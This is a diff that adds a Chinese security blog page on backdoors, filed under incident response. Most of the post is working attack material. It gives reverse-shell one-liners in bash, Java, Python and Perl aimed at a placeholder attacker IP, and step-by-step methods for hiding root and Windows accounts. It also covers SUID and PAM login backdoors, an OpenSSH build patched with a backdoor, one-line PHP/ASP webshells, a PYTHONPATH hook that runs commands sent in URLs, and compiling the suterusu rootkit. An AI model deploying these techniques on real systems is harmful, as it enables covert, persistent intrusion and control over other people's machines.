+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=安全应急之后门篇&url=https://l0gs.xf0rk.space/2018/10/04/about-the-backdoor/index.html&via=xF0rk" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <blockquote><p>后门是一种绕过认证或系统加密的方法，开发人员会出于某原因，可能为自己的程序构建后门程序。例如，为了提供简单的维护，开发人员引入了一个后门，可以恢复设备厂商的默认密码；同时攻击者也会将后门种植到有漏洞的服务器来接管服务器，执行攻击和上传恶意payload。</p>
+</blockquote>
+<h2 id="后门简介"><a href="#后门简介" class="headerlink" title="后门简介"></a>后门简介</h2><h3 id="反弹-SHELL-技术"><a href="#反弹-SHELL-技术" class="headerlink" title="反弹 SHELL 技术"></a>反弹 SHELL 技术</h3><p>当目标系统为 LINUX 时，反弹 SHELL 在漏洞证明、利用中是一个有效的手段。可在目标机器执行 <code>bash -i &gt;&amp; /dev/tcp/[攻击者IP]/[攻击者端口] 0&gt;&amp;1</code> 反弹 SHELL。</p>
+<img src="/2018/10/04/about-the-backdoor/reverse_shell_exec_client.png">
+<blockquote>
+<p><code>bash -i</code> 用于创建一个交互式 BASH；<code>&gt;&amp; /dev/tcp/[攻击者IP]/[攻击者端口]</code> 建立 TCP 连接，将标准输出和错误输出重定向到 TCP 连接；<code>0&gt;&amp;1</code> 用于从 TCP 连接获取输入并传入到 BASH。</p>
+</blockquote>
+<p>如下所示为一个 BASH 语言实现的反弹 SHELL 示例，攻击者外网机器执行命令<code>nc -l [攻击端口]</code>，获取 TCP 连接后可直接执行命令</p>
+<img src="/2018/10/04/about-the-backdoor/reverse_shell_exec_server.png">
+<p>反弹 SHELL 可在目标机器使用 NC 监听端口，可利用常规服务端口 80、8080 等用来绕过可能存在的外部防火墙的网络控制策略。</p>
+<h4 id="BASH-语言"><a href="#BASH-语言" class="headerlink" title="BASH 语言"></a>BASH 语言</h4><pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/[攻击者IP]/[攻击者端口]; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</code></pre><h4 id="JAVA-语言"><a href="#JAVA-语言" class="headerlink" title="JAVA 语言"></a>JAVA 语言</h4><pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/[攻击者IP]/[攻击者端口];cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre><h4 id="PYTHON-语言"><a href="#PYTHON-语言" class="headerlink" title="PYTHON 语言"></a>PYTHON 语言</h4><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[攻击者IP]&quot;,[攻击者端口]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre><h4 id="PERL-语言"><a href="#PERL-语言" class="headerlink" title="PERL 语言"></a>PERL 语言</h4><pre><code>perl -e &#39;use Socket;$i=&quot;[攻击者IP]&quot;;$p=[攻击者端口];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><h3 id="反弹-SHELL-持久化"><a href="#反弹-SHELL-持久化" class="headerlink" title="反弹 SHELL 持久化"></a>反弹 SHELL 持久化</h3><p>如下图，根据 <a href="https://attack.mitre.org/" title="[MITRE]" target="_blank" rel="noopener">MITRE</a> 攻击矩阵，反弹 SHELL 可持久化在<code>.bash_profile</code>、<code>.bashrc</code>、启动服务、浏览器插件、HOOK 操作、登录启动脚本等系统功能模块中。</p>
+<img src="/2018/10/04/about-the-backdoor/attack_matrix.png">
+<h2 id="隐藏系统用户"><a href="#隐藏系统用户" class="headerlink" title="隐藏系统用户"></a>隐藏系统用户</h2><h3 id="LINUX-隐藏高权限账号"><a href="#LINUX-隐藏高权限账号" class="headerlink" title="LINUX 隐藏高权限账号"></a>LINUX 隐藏高权限账号</h3><p>LINUX 中隐藏高全权限用户可直接编辑 <code>/etc/passwd</code> 文件，将文件中指定用户 UID 和 GID 值修改为 0</p>
+<img src="/2018/10/04/about-the-backdoor/linux_uid_gid_0.png">
+<p>如下所示，可直接隐藏用户权限为 root 权限和用户组</p>
+<img src="/2018/10/04/about-the-backdoor/linux_hide_high_user.png">
+<h3 id="WINDOWS-用户隐藏"><a href="#WINDOWS-用户隐藏" class="headerlink" title="WINDOWS 用户隐藏"></a>WINDOWS 用户隐藏</h3><p>修改注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\</code> 权限为管理员完全控制，如下图所示</p>
+<img src="/2018/10/04/about-the-backdoor/win_regedit_permission.png">
+<p>新建特殊账户，无法通过 <code>net user</code>查看到用户</p>
+<img src="/2018/10/04/about-the-backdoor/win_new_user.png">
+<p>用户名以 <code>$</code> 结尾的通过 <code>net user</code> 无法查看到指定用户，但可在控制面板查看用户</p>
+<img src="/2018/10/04/about-the-backdoor/win_user_control_panel.png">
+<p><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code> 中查找新建用户 <code>xf0rk$</code> 默认类型为 <code>0x3ea</code>，将注册表 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\xf0rk$</code> 导出为 <code>1.reg</code></p>
+<img src="/2018/10/04/about-the-backdoor/win_regedit_backup.png">
+<p>在注册表查找 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code> 导出为 <code>2.reg</code>，将 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code> 导出为 <code>3.reg</code>，将注册表项 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code> 下键 <code>F</code> 的值替换为 <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code> 下键 <code>F</code> 的值，如下图所示</p>
+
+<p>命令行删除特殊账户 <code>net user xf0rk$ /del</code>，导入 <code>1.reg</code>、<code>2.reg</code> 注册表文件，此时无法通过 <code>net user</code> 查看该账户，也无法在控制面板中看到该账户，但可通过 <code>net user xf0rk$</code> 查看用户信息</p>
+<img src="/2018/10/04/about-the-backdoor/win_regedit_restore.png">
+<h2 id="SUID-权限隐藏"><a href="#SUID-权限隐藏" class="headerlink" title="SUID 权限隐藏"></a>SUID 权限隐藏</h2><blockquote>
+<p>SUID 是 Linux 的一种权限机制,具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限，如果拥有 SUID 权限,那么就可以利用系统中的二进制文件和工具来进行 ROOT 提权。</p>
+</blockquote>
+<p>如下文件名为 <code>...</code> ( 可通过创建 <code>...</code> 与 <code>.</code>、<code>..</code> 相近的文件名来干扰管理员排查后门 )，权限为 <code>-rwsr-xr-x</code>，说明普通用户执行该文件时可获得文件拥有者 root 权限。以当前用户 xf0rk 执行命令 <code>useradd test</code> 发现用户权限过低无法创建用户，通过执行 <code>...</code> 文件提权后执行 <code>useradd test</code> 成功创建用户。 </p>
+<img src="/2018/10/04/about-the-backdoor/suid_shell.png">
+<h2 id="LINUX-PAM-后门"><a href="#LINUX-PAM-后门" class="headerlink" title="LINUX PAM 后门"></a>LINUX PAM 后门</h2><h3 id="LINUX-PAM-简介"><a href="#LINUX-PAM-简介" class="headerlink" title="LINUX PAM 简介"></a>LINUX PAM 简介</h3><blockquote>
+<p>Linux-PAM (linux可插入认证模块)是一套共享库，使本地系统管理员可以方便配置程序的认证方式，即可不用重新编译一个包含 PAM 功能的应用程序就改变它使用的认证机制。PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security 下的模块。</p>
+</blockquote>
+<p>PAM 配置可分为四个参数 <code>模块类型 控制标记 模块路径 模块参数</code>，例如 <code>session  required   pam_selinux.so  open</code></p>
+<img src="/2018/10/04/about-the-backdoor/pam_flow.png">
+<p>PAM 模块类型包含 auth（认证管理）、account（账号管理）、session（会话管理）、password（密码管理）四种：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">模块类型</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">auth</td>
+<td style="text-align:left">用户身份识别，如提示输入密码、判断是否为 root 等</td>
+</tr>
+<tr>
+<td style="text-align:left">account</td>
+<td style="text-align:left">对账号的各项属性进行检查，如是否允许登录、是否达到最大用户数、判断 root 用户是否允许终端登录等</td>
+</tr>
+<tr>
+<td style="text-align:left">session</td>
+<td style="text-align:left">定义用户登录前及用户退出后所需要进行的操作，如登录连接信息、用户数据打开、挂载文件系统等</td>
+</tr>
+<tr>
+<td style="text-align:left">password</td>
+<td style="text-align:left">使用用户信息来更新，如修改用户密码</td>
+</tr>
+</tbody>
+</table>
+<p>PAM 的控制标记来处理和判断各模块的返回值</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">控制标记</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">required</td>
+<td style="text-align:left">若成功，继续检查下一个模块并取决于其他模块；若失败，则停止并返回失败</td>
+</tr>
+<tr>
+<td style="text-align:left">requisite</td>
+<td style="text-align:left">若成功，继续检查下一个模块并取决于其他模块；若失败，继续检查下一个模块，并返回失败</td>
+</tr>
+<tr>
+<td style="text-align:left">sufficient</td>
+<td style="text-align:left">若成功，则停止并返回成功；若失败，继续检查下一个模块并取决于其他模块</td>
+</tr>
+<tr>
+<td style="text-align:left">optional</td>
+<td style="text-align:left">若成功，则继续检查下一个并取决于其他模块，若失败，继续检查下一个模块，并取决于其他模块</td>
+</tr>
+<tr>
+<td style="text-align:left">include</td>
+<td style="text-align:left">无关，执行包含文件中的验证，取决于其他模块</td>
+</tr>
+</tbody>
+</table>
+<p>PAM 模块路径指要调用的模块位置，同一个模块可以出现在不同的类型中，不同的类型所执行的操作都不相同，模块参数即传递给模块的参数，参数之间用空格分隔开。</p>
+<h3 id="PAM-LISTFILE-模块后门"><a href="#PAM-LISTFILE-模块后门" class="headerlink" title="PAM LISTFILE 模块后门"></a>PAM LISTFILE 模块后门</h3><p>PAM 中模块 pam_listfile.so，允许保存在/tmp/users 中的用户登录，其中 users 文件中的用户名为 <code>root</code> 即只要是 root 用户（sufficient 控制标记，匹配存在则可直接返回成功）均可以直接登录。</p>
+<img src="/2018/10/04/about-the-backdoor/pam_listfile.png">
+<h3 id="PAM-ROOTOK-模块后门"><a href="#PAM-ROOTOK-模块后门" class="headerlink" title="PAM ROOTOK 模块后门"></a>PAM ROOTOK 模块后门</h3><p>PAM 中模块 rootok.so，使 uid 为 0 的用户（ root ）能够直接通过认证而不用输入密码，系统文件 <code>/etc/pam.d/su</code> 中默认存在 <code>auth sufficient  pam_rootok.so</code> 即 root 用户可以不输密码执行 su 命令。当通过将 sshd 软链到文件名为 su 的文件时，执行 su 文件会加载 pam_rootok.so 模块，此时若使用 root 用户登录，则可免密直接登录成功。</p>
+<img src="/2018/10/04/about-the-backdoor/pam_rootok.png">
+<p>root 用户可任意密码可直接登录系统，执行任意命令</p>
+<img src="/2018/10/04/about-the-backdoor/pam_rootok_shell.png">
+<h2 id="LINUX-SSH-后门"><a href="#LINUX-SSH-后门" class="headerlink" title="LINUX SSH 后门"></a>LINUX SSH 后门</h2><p>LINUX SSH 后门通过编译 PATCH 到原 SSH 应用，来生成 SSH 后门 <a href="http://core.ipsecs.com/rootkit/patch-to-hack/" title="[下载文件]" target="_blank" rel="noopener">下载文件</a>，具体步骤如下所示</p>
+<pre><code>tar zxvf openssh-5.9p1.tar.gz
+tar zxvf openssh-5.9p1.patch.tar.gz
+cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面
+patch &lt; sshbd5.9p1.diff
+</code></pre><p>修改后门密码和文件记录，如下图所示</p>
+<img src="/2018/10/04/about-the-backdoor/linux_ssh_patch.png">
+<p>修改版本为目标机器 SSH 版本，字段为 <code>SSH_VERSION</code></p>
+<pre><code>root@localhost openssh-5.9p1# vim version.h
+#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;
+#define SSH_PORTABLE &quot;p1&quot;
+#define SSH_RELEASE SSH_VERSION SSH_PORTABLE
+
+</code></pre><p>安装编译依赖包并编译安装</p>
+<pre><code>yum install -y openssl openssl-devel pam-devel
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+
+yum install -y zlib zlib-devel    //  http://sourceforge.net/projects/libpng/files/zlib/1.2.3/zlib-1.2.3.tar.gz/download
+
+
+make &amp;&amp; make install
+</code></pre><p>重启 SSH 服务即可，<code>service sshd restart</code></p>
+<h2 id="WebShell-后门"><a href="#WebShell-后门" class="headerlink" title="WebShell 后门"></a>WebShell 后门</h2><blockquote>
+<p>WebShell 是 Web 服务器上的管理工具，可以对 Web 服务器进行网站管理、服务器管理，可管理服务器文件、查看数据库等。攻击者可利用 Web 漏洞上传 WenShell 到 Web 服务器的页面目录下，通过直接访问上传文件进行入侵、保留权限等。</p>
+</blockquote>
+<p>WebShell 根据功能分为大马、小马，小马通常指一句话木马，如下所示</p>
+<pre><code>PHP   &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;
+ASP   &lt;%eval request(&quot;pass&quot;)%&gt;
+ASP.NET   &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
+</code></pre><p>通过中国菜刀连接到已成功上传的小马，可进行服务器文件管理，如下为操作文件和执行命令</p>
+<img src="/2018/10/04/about-the-backdoor/caidao_file_dir.png">
+<img src="/2018/10/04/about-the-backdoor/caidao_shell.png">
+<h2 id="第三方依赖库后门"><a href="#第三方依赖库后门" class="headerlink" title="第三方依赖库后门"></a>第三方依赖库后门</h2><p>如下图，在 Python 默认 string 库中嵌入式恶意代码，代码 import string 操作时可触发一段恶意代码</p>
+<img src="/2018/10/04/about-the-backdoor/pythonpath_backdoor.png">
+<p>隐藏在 PYTHONPATH 的后门处于 Python 解释器和 OS/Kernel 之间，通常通过 import x 查找顺序为：当前目录 -&gt; PYTHONPATH 环境变量 -&gt; 默认 Python 库目录，如下图所示</p>
+<img src="/2018/10/04/about-the-backdoor/pythonpath_import.png">
+<p>基于 Django 框架开发的测试网站，其 urls.py 文件中路由配置如下所示，其仅包含根目录和admin目录两个目录</p>
+<pre><code>from django.conf.urls import url
+from django.contrib import admin
+
+urlpatterns = [
+    url(r&#39;^admin/&#39;, admin.site.urls),
+]
+</code></pre><p>如下代码，利用 PYTHONPATH 重载了socket.py 模块，实现访问所有 URL 链接添加 cmd 参数，则可直接执行命令</p>
+<pre><code>def _hook_readline(self, *args, **kwargs):
+        retval = object.__getattribute__(self, &#39;readline&#39;)(*args, **kwargs)
+        if retval.startswith(&#39;GET /?cmd=&#39;):
+            (verb, url, version) = retval.split(&#39; &#39;)
+            self.__outputs__.put(os.popen(urllib.unquote_plus(url[6:])).read())
+        return retval
+</code></pre><p>如下为通过引入 <code>?cmd=ifconfig</code> 来执行 <code>ifcnfig</code> 命令</p>
+<img src="/2018/10/04/about-the-backdoor/pythonpath_web_backdoor.png">
+<h2 id="ROOTKIT-后门"><a href="#ROOTKIT-后门" class="headerlink" title="ROOTKIT 后门"></a>ROOTKIT 后门</h2><blockquote>
+<p>ROOTKIT 是使不法用户具有系统超级管理权限，并能隐藏自身入侵系统的信息，来实现长期权限控制的工具集。ROOKIT 根据工作层次可分为用户级、内核级、芯片虚拟化级三层，用户级可划分为对 Linux 输出结果进行封装和替换 Linux 命令型的 ROOKIT；内核级有效劫持系统调用输出的 ROOKIT，包括利用 LKM 动态修改内核、替换 SYS_CALL 实现劫持、工作在 VFS 利用 Hook 文件系统的 file_open 操作；芯片级即集成到 Intel 或 AMD 芯片中的 ROOKIT。</p>
+</blockquote>
+<img src="/2018/10/04/about-the-backdoor/rootkit_arch_show.png">
+<p>下面将展示如何编译和使用 suterusu ROOKIT <a href="https://github.com/mncoppola/suterusu" title="[下载地址]" target="_blank" rel="noopener">下载地址</a> 。</p>
+<pre><code>[root@Centos7 suterusu]# yum install kernel-devel
+Failed to set locale, defaulting to C
+Loaded plugins: fastestmirror
+Loading mirror speeds from cached hostfile
+ * base: mirrors.163.com
+ * epel: fedora.cs.nctu.edu.tw
+ * extras: mirrors.163.com
+ * updates: mirrors.cn99.com
+Package kernel-devel-3.10.0-862.14.4.el7.x86_64 already installed and latest version
+Nothing to do
+[root@Centos7 suterusu]# ls /usr/src/kernels/3.10.0-862.14.4.el7.x86_64/
+Kconfig   Makefile.qlock  System.map  block   drivers   fs       init  kernel  mm   samples  security  tools  virt
+Makefile  Module.symvers  arch        crypto  firmware  include  ipc   lib     net  scripts  sound     usr    vmlinux.id
+[root@Centos7 suterusu]#
+</code></pre><p>编译内核模块</p>
+<pre><code>[root@Centos7 suterusu]# make linux-x86 KDIR=/usr/src/kernels/3.10.0-862.14.4.el7.x86_64/
+make ARCH=x86 EXTRA_CFLAGS=&quot;-D_CONFIG_X86_ &quot; -C /usr/src/kernels/3.10.0-862.14.4.el7.x86_64/ M=/tmp/suterusu modules
+make[1]: Entering directory `/usr/src/kernels/3.10.0-862.14.4.el7.x86_64&#39;
+  CC [M]  /tmp/suterusu/main.o
+  CC [M]  /tmp/suterusu/util.o
+  CC [M]  /tmp/suterusu/module.o
+  LD [M]  /tmp/suterusu/suterusu.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /tmp/suterusu/suterusu.mod.o
+  LD [M]  /tmp/suterusu/suterusu.ko
+make[1]: Leaving directory `/usr/src/kernels/3.10.0-862.14.4.el7.x86_64&#39;
+[root@Centos7 suterusu]# ls |grep suterusu.ko
+suterusu.ko
+[root@Centos7 suterusu]#
+</code></pre><p>安装内核模块</p>
+<pre><code>insmod suterusu.ko
+</code></pre><p>编译用户态应用</p>
+<pre><code>[root@Centos7 suterusu]# gcc sock.c -o sock
+sock.c: In function &#39;main&#39;:
+sock.c:205:40: warning: incompatible implicit declaration of built-in function &#39;strlen&#39; [enabled by default]
+                 rk_file_args.namelen = strlen(name);
+                                        ^
+sock.c:220:40: warning: incompatible implicit declaration of built-in function &#39;strlen&#39; [enabled by default]
+                 rk_file_args.namelen = strlen(name);
+                                        ^
+[root@Centos7 suterusu]# ls |grep sock
+sock
+</code></pre><p>用户态命令参数</p>
+<pre><code>./sock 0 获取 ROOT 权限
+./sock 1 [PID] 隐藏指定 PID 应用
+./sock 2 [PID] 显示指定 PID 应用
+./sock 3 [PORT] 隐藏指定 PORT
+./sock 4 [PORT] 显示指定 PORT
+./sock 11 [name] 隐藏指定文件名或文件夹
+./sock 12 [name] 显示指定文件名或文件夹
+
+…… 更多命令参数请参考官方项目文档
+</code></pre><p>如下所示，进行隐藏端口、隐藏进程演示</p>
+<img src="/2018/10/04/about-the-backdoor/rootkit_show.png">
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/12/21/step-into-modsecurity/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/08/25/apache-struts2-cve-2018-11776/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="xF0rk's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        xf0rk@outlook.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="mailto:xf0rk@outlook.com" target="_blank" title="与我联系">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        与我联系
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2019/04/">四月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">1</span></a>
+            </li></ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/安全应急/">安全应急<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/categories/安全建设/">安全建设<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/漏洞分析/">漏洞分析<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/随笔杂谈/">随笔杂谈<span class="sidebar_archives-count">1</span></a>
+            </li></ul>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">6</span>
+            </a>
+        </li>
+        
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/timeline" title="时间轴">
+                
+                    <i class="material-icons sidebar-material-icons">timeline</i>
+                
+                时间轴
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/tags" title="标签云">
+                
+                    <i class="material-icons sidebar-material-icons">loyalty</i>
+                
+                标签云
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+        <li>
+            <a href="/about" title="关于我">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于我
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!-- Sidebar Divider -->
+
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/xF0rk" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/xf0rk" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©&nbsp;2018&nbsp;-<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>L0gs 4 xF0rk
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import File -->
+
+
+    <script>lsloader.load("js/lazyload.min.js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
+    <script>lsloader.load("js/js.min.js","/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
+
+
+
+    <script>lsloader.load("js/nprogress.js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+    <!-- Busuanzi -->
+    <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Window Load-->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+</script>
+
+<!-- MathJax Load-->
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Bing Background -->
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
